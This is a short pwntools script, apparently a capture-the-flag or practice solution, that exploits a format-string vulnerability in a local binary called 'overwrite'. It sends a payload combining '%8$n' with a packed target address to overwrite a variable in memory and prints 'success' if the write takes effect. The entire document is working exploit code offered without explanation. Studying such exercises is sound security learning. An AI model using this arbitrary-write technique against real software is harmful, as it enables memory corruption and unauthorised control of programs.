from pwn import *
p = process("./overwrite")
p.recvline()
a_addr = 0x0804A024
payload = "aa%8$nkk" + p32(a_addr)
p.sendline(payload)
info = p.recv()
if "modified a" in info:
	print "success"
